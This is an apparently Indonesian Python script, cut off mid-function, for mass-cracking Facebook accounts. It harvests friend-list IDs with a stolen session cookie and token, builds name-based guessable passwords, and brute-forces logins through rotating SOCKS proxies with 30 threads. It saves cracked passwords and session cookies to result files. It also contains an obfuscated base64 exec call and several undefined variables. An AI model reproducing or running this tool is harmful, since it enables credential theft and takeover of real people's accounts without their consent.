#MODULE
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Cannot Install Rich Module, Try Manual Install (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
import base64
exec(base64.b64decode(b'ZnJvbSByaWNoIGltcG9ydCBwcmludCBhcyBwYW5qaWhpdGFt=='))
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()

# UA LIST
#ugen2=[]
#ugen=[]
#ugen3=[]
cokbrut=[]
ses=requests.Session()
princp=[]
pwv=[]

ugen = ['Mozilla/5.0 (Linux; Android 12; PEMSES) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.39']
ugen2 = ['Mozilla/5.0 (Linux; arm_64; Android 12; POCO F2 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.141 Mobile Safari/537.36']
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	exit(e)
	print('[[\x1b[1;92m=>\x1b[1;97m] [\x1b[1;96mk4long666')
prox=open('.prox.txt','r').read().splitlines()

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
try:
	os.system('curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt -o socks4.txt')
except:
	pass
sock=open('socks4.txt','r').read().splitlines()

def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
		ua=open('.user-agents.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.user-agents.txt','r').read().splitlines()

#-------- LOADING ANIMASI ------------
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r {N}[{H}•{N}] {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")

# INDICATION
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

def cocok():
	try:
		cokbru=open('.cookie.txt').read()
		cokbrut.append(cokbru)
	except:
		login_lagi334()

#------------[ WARNA-COLOR ]--------------#
### WARNA RANDOM ###
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)

# Converter Bulan
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

# CLEAR
def clear():
	os.system('clear')

# BACK
def back():
	login()

#LOGO
def banner():
	clear()
	print("""%s   
𝙏𝙀𝘿𝘿𝙔 𝘾𝘼𝙃𝙔𝙊 𝙋𝙐𝙏𝙍𝘼 𝙋𝘼𝙉𝙂𝙀𝙈𝘽𝘼𝙍𝘼\n𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙈𝙀𝙉𝙏 𝘾𝙍𝘼𝘾𝙆𝙄𝙉𝙂 𝘼𝙉𝘿 𝘾𝙇𝙊𝙉𝙀 \n𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 𝙈𝙀𝙏𝘼𝙑𝙀𝙍𝙎 𝙄𝙉𝘿𝙊𝙉𝙀𝙎𝙄𝘼.%s
(+) SUPPORT ALL SIM CARD%s
(-) TIDAK SUPPORT WI-FI%s
[✓] SCRIP INI GRATIS\n JANGAN PERJUAL BELIKAN,\n SALING BERBAGI AJAH FILE\n SC INI YAH KONTOL !
"""%(M,P,M,H))
#LOGIN
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='purple')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	os.system('clear')
	banner()
	warna = random.choice([
 P, M, H, K, B, U, O, N])
	yu = ' Ketik [green]Get[/green] kalo mau tau cara dapet cookie'
	yi = nel(yu,style='')
	sol().print(yi)
	cookie=input(f'  [{h}•{x}] Masukkan Cookie :{warna} ')
	if cookie in ['get','Get']:
		os.system('xdg-open https://www.youtube.com/watch?v=KWVro6bGdXw')
	loading()
	try:
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
		exit()

def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r {N}[{H}•{N}] {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")

#MENU 
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	print(f" {BM}LOGIN INFO{N}")
	print(f"{P} [{H}•{P}] Your IP   : {ip}")
	print(f"{P} [{H}•{P}] NAME      : {my_name}")
	print(f"{P} [{H}•{P}] Your ID   : {my_id}")
	print("%s══════════════════════════════════════════"%(N))
	print(f" {BM}OPTION MENU{N}")
	print(' [%s01%s] Public Friends (%sON%s)'%(H,N,H,N));time.sleep(0.03)
	print(' [%s02%s] Random ID Massal (%sON%s)'%(H,N,H,N));time.sleep(0.03)
	print(' [%s03%s] Crack From Files (%sON%s)'%(H,N,H,N));time.sleep(0.03)
	print(' %s[%s04%s] %sCEK RESULTS%s%s                                             '%(P,H,P,P,P,H));time.sleep(0.02)
	print(' [%s00%s] Logout (%sRemove Token/Cookie%s)'%(M,N,M,N));time.sleep(0.03)
	jh=input('\n %s[%s?%s] Select menu : '%(N,K,N))
	if jh == '':
		jh('\n %s[%s×%s] Sorry the menu selection is wrong...!'%(N,M,N));time.sleep(2);menu()
	#print('╚══════════════════════════════════════════════════════════════╝')
	if jh in ['1','01']:
		dump_publik()
	elif jh in ['2','02']:
		multicrack()
	elif jh in ['3','03']:
		crack_file()
	elif jh in ['4','04']:
		result()
	elif jh in ['0','00']:
		print("")
		titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
		for x in titik:
			 sys.stdout.write('\r %s[%s!%s] Deleting Token/Cookie %s'%(N,M,N,x)); sys.stdout.flush()
			 time.sleep(1)
		os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt')
		jalan('\n %s[%s✓%s] %sSuccessfully delete Token/Cookie...'%(N,H,N,H))
		jalan('\n %s[%s✓%s] Retrun SC type "%spython run.py%s"'%(N,H,N,H,N));exit()
	else:
		jalan('\n %s[%s×%s] Sorry menu [%s%s%s] moderate improvement...!'%(N,M,N,M,jh,N));time.sleep(1);menu(my_name,my_id)
	return __crack__().plerr(id)

#-------------------[ CRACK-PUBLIK ]----------------#
def dump_publik():
	try:
		cok= open('.cok.txt','r').read()
	except IOError:
		exit()

#	print("%s══════════════════════════════════════════\n %sTARGET INFO%s"%(N,BM,N))
	pil = input(' %s[%s?%s] Enter ID/Uname : %s'%(N,K,N,H))
	try:
		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {"cookie":cok}).json()
		for pi in koh2['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(P+'['+M+'=>'+P+'] TOTAL ID : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f" {BM}BAD CONNECTION !!{N}")
		exit()
	except KeyError:
            jalan(f' %s[%s×%s] Sorry %sID is not public/Invalid token%s'%(N,M,N,M,N));time.sleep(1);dump_publik()()

#-------------------[ CRACK-MASAL ]----------------#
def multicrack():
	try:
		cok= open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		nanya_keun = int(input(f' %s[%s?%s] Enter the target amount : %s'%(N,K,N,H)))
	except:nanya_keun=100000000
	for mnh in range(nanya_keun):
		mnh +=1
		print()
		pil = input('%s[%s?%s] Enter ID/Uname %s%s%s : %s'%(N,K,N,H,mnh,N,H))
		try:
			koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {"cookie":cok}).json()
			for pi in koh2['friends']['data']:
				try:id.append(pi['id']+'|'+pi['name'])
				except:continue
		except requests.exceptions.ConnectionError:
			print(f" {BM}BAD CONNECTION !!{N}")
		except (KeyError,IOError):
			jalan(f' %s[%s×%s] Sorry %sID is not public/Invalid token%s'%(N,M,N,M,N));time.sleep(1);multicrack()()
	print()
	print(P+'['+H+'=>'+P+'] TOTAL : '+str(len(id)))
	setting()


#-----------------[ RESULTS ]-----------------#
def result():
	cek = '# CEK HASIL CRACK'
	sol().print(mark(cek, style='bold red'))
	kayes = '[bold red][[bold white]01[bold red]][bold black] HASIL CP\n[bold red][[bold white]02[bold red]][bold black] HASIL OK\n[bold red][[bold white]00[bold red]][bold black] MENU'
	kis = nel(kayes, style='black')
	panjihitam(nel(kis, title='[bold red][[bold white]HASIL RESULTS[bold red]]'))
	kz = input(N+'['+M+'➣'+N+'] KETIK PILIHAN : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			gada = '# DIREKTORI TIDAK DITEMUKAN'
			sol().print(mark(gada, style='red'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# ANDA BELUM MEMILIKI RESULT CP'
			sol().print(mark(haha, style='red'))
			time.sleep(2)
			back()
		else:
			gerr = '# HASIL CP ANDA'
			sol().print(mark(gerr, style='red'))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
			gerr2 = '# CHECK HASIL CRACK'
			sol().print(mark(gerr2, style='red'))
			geeh = input(N+'['+M+'➣'+N+'] MENU : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# PILIHAN TIDAK ADA DI MENU'
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
				sol().print(mark(hehe, style='bold red'))
				time.sleep(2)
				back()
			akun = '# HASIL CHECKPOINT/CP'
			sol().print(mark(akun, style='bold red'))
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# USERNAME : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="bold yellow"))
				nocp +=1
			akun2 = '# HASIL CHECKPOINT/CP'
			sol().print(mark(akun, style='bold red'))
			input(N+'['+M+'➣'+N+'] KEMBALI : ')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK/')
		except FileNotFoundError:
			gada = '# DIREKTORI TIDAK DITEMUKAN'
			sol().print(mark(gada, style='red'))
			time.sleep(2)
			back()
		if len(vin)==0:
			haha = '# ANDA BELUM MEMILIKI RESULT OK'
			sol().print(mark(haha, style='red'))
			time.sleep(2)
			back()
		else:
			gerr = '# HASIL LIVE/OK'
			sol().print(mark(gerr, style='red'))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' Akun'+x)
			gerr2 = '# CEK HASIL CRACK'
			sol().print(mark(gerr2, style='red'))
			geeh = input(N+'['+M+'➣'+N+'] MENU : ')
			try:geh = lol[geeh]
			except KeyError:
				ric = '# PILIHAN TIDAK ADA DI MENU'
				sol().print(mark(ric, style='bold red'))
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				hehe = '# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGI'
				sol().print(mark(hehe, style='bold red'))
				time.sleep(2)
				back()
			akun = '# HASIL LIVE/OK'
			sol().print(mark(akun, style='bold red'))
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# USERNAME : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="bold green"))
				print(f'{h}COOKIE : {x}{cpkuni[2]}')
				nocp +=1
			akun2 = '# HASIL LIVE/OK'
			sol().print(mark(akun, style='red'))
			input(N+'['+M+'➣'+N+'] KEMBALI : ')
			back()
	elif kz in ['0','00']:
		back()
	else:
		ric = '# PILIHAN TIDAK ADA DI MENU'
		sol().print(mark(ric, style='bold red'))
		exit()

#-------------[ CRACK-FROM-FILE ]------------------#
def crack_file():
	cek = '# CRACK DARI FILE DUMP'
	sol().print(mark(cek, style='red'))
	try:vin = os.listdir('DUMP')
	except FileNotFoundError:
		gada = '#PENYIMPANAN TIDAK TERSEDIA '
		sol().print(mark(gada, style='red'))
		time.sleep(2)
		back()
	if len(vin)==0:
		haha = '# ANDA BELUM MEMILIKI FILE DUMP'
		sol().print(mark(haha, style='red'))
		time.sleep(2)
		back()
	else:
		gerr = '# FILE DUMP ANDA'
		sol().print(mark(gerr, style='red'))
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
		gerr2 = '# PILIH FILE YANG MAU DI CRACK'
		sol().print(mark(gerr2, style='red'))
		geeh = input(N+'['+M+'➣'+N+'] KETIK PILIHAN : ')
		try:geh = lol[geeh]
		except KeyError:
			ric = '# OPTION NOT IN THE MENU'
			sol().print(mark(ric, style='red'))
			exit()
		try:lin = open('DUMP/'+geh,'r').read().splitlines()
		except:
			hehe = '# FILE TIDAK TERSEDIA SILAKAN COBA KEMBALI'
			sol().print(mark(hehe, style='red'))
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
def tipsx():
	print('NEXT UPDATE BRO')

#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	wl = '# METHODE CRACK ID'
	sol().print(mark(wl, style='red'))
	teks = '[bold red][[bold white]01[bold red]][bold black] AWALI CRACK DARI ID OLD [bold red][[bold white]NORMAL[bold red]]\n[bold red][[bold white]02[bold red]][bold black] AWALI CRACK DARI ID NEW [bold red][[bold green]RECOMM ME[bold red]]\n[bold red][[bold white]03[bold red]][bold black] CRACK DARI ID RANDOM [bold red][[bold green]LEBIH BAIK[bold red]]'
	tak = nel(teks, style='black')
	panjihitam(nel(tak, title='[bold red][[bold white]METHODE CRACK[bold red]]'))
	hu = input(N+'['+M+'➣'+N+'] PILIH METHODE : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		ric = '# OPTION NOT IN THE MENU'
		sol().print(mark(ric, style='red'))
		exit()
	met = '# METHODE LOGIN FACEBOOK'
	sol().print(mark(met, style='red'))
	ioz = '[bold red][[bold white]01[bold red]][bold black] MOBILE FACEBOOK [bold red][[bold green]Slow[bold red]]\n[bold red][[bold white]02[bold red]][bold black] TOUCH FACEBOOK [bold red][[bold green]Fast[bold red]]\n[bold red][[bold white]03[bold red]][bold black] MBASIC FACEBOOK [bold red][[bold green]Normal[bold red]]'
	gess = nel(ioz, style='black')
	panjihitam(nel(gess, title='[bold red][[bold white]LOGIN FACEBOOK MELALUI[bold red]]'))
	hc = input(N+'['+M+'➣'+N+'] PILIH LOGIN : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('touch')
	elif hc in ['3','03']:
		method.append('mbasic')
	elif hc in ['4','04']:
		method.append('cracktouch')
	else:
		method.append('mobile')
		
	guw = '# TAMBAHKAN PASSWORD MANUAL {y/t}'
	sol().print(mark(guw, style='red'))
	pwplus = input(N+'['+M+'➣'+N+'] KETIK PILIHAN : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		krek = '[➣] GUNAKAN COMMA UNTUK PEMISAH PASSWORD\n[➣] MAXIMAL 5 PASSWORD SAJA\n[➣] CONTOH PASSWORD : mrpanjihitam,sayang,cantik,indonesia'
		panjihitam(nel(krek, title='[bold red][[bold green]PASSWORD TAMBAHAN[bold red]]'))
		pwku=input(N+'['+M+'➣'+N+'] PASSWORD TAMBAHAN : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()

#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	ler = '# PROSES CRACK SEDANG DIMULAI'
	sol().print(mark(ler, style='red'))
	krek = '      HASIL LIVE TERSIMPAN DI : OK/%s\n        HASIL CP TERSIMPAN DI : CP/%s\n          ON/OFF MODE PESAWAT JIKA TIDAK ADA HASIL\n             PROXY SETIAP WAKTU OTOMATIS UPDATE'%(okc,cpc)
	panjihitam(nel(krek, title='[bold red][[bold white]PROSES SEDANG BERLANGSUNG[bold red]]'))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			try:
				idf,nmf,ttl = yuzong.split('|')[0],yuzong.split('|')[1].lower(),yuzong.split('|')[2].lower()
			except:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			try:
				pwv = []
			except:
				pwv = ['sayang','kolaka','kendari','anjing','katasandi']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					#pwv.append(frs+'123456')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					#pwv.append(frs+'123456')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv,nmf)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv,nmf)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv,nmf)
			elif 'free' in method:
				pool.submit(cracktouch,idf,pwv,nmf)
			else:
				pool.submit(crackmbasic,idf,pwv,nmf)
	print('')
	tanya = '# CEK HASIL CRACK?'
	sol().print(mark(tanya, style='black'))
	woi = input(N+'['+M+'➣'+N+'] APAKAH INGIN CEK HASIL RESULTS? [y/t] : ')
	if woi in ['y','Y']:
		result()
	else:
		exit()
#--------------------[ METODE MOBILE ]-----------------#
def crack(idf,pwv,nmf):
	global loop,ok,cp
	animasi = random.choice(["\x1b[1;91m🕧","\x1b[1;92m🕐","\x1b[1;93m🕑","\x1b[1;94m🕒","\x1b[1;95m🕓","\x1b[1;96m🕔","\x1b[1;97m🕕","\x1b[1;91m🕖","\x1b[1;92m🕗","\x1b[1;93m🕘","\x1b[1;94m🕙","\x1b[1;95m🕚","\x1b[1;96m🕛"])
	sys.stdout.write(f"\r {animasi} {P}[{M}{loop}{N}/{M}{len(id)}{P}] {P}[{H}OK:{ok}{P}] {P}[{M}CP:{cp}{P}] [{H}{'{:.0%}'.format(loop/float(len(id)))}{P}]"),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			pw = pw.lower()
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n')
				cpngab = f'[➣] NAMA : {nmf}\n[➣] ID FACEBOOK : {idf}\n[➣] PASSWORD : {pw}'
				cpgan = nel(cpngab, style='white')
				panjihitam(nel(cpgan, title='[bold red][[bold yellow]CHECKPOINT[bold red]]'))				
				open('CP/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print('\n')
				okengab = f'[➣] NAMA : {nmf}\n[➣] ID FACEBOOK : {idf}\n[➣] PASSWORD : {pw}\n[➣] COOKIES  : {kuki}'
				okegan = nel(okengab, style='white')
				panjihitam(nel(okegan, title='[bold red][[bold green]LIVE - OK[bold red]]'))				
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(61)
	loop+=1

#--------------------[ METODE TOUCH ]-----------------#
def crackmbasic(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice([M,P,H,K,B])
	pers = loop*100/len(id2)
	fff = '%'
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = random.choice(ugent)
	ua2 = random.choice(ugent2)
	ses = requests.Session()
	sys.stdout.write('\r%s  %s/%s  OK:%s CP:%s  %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
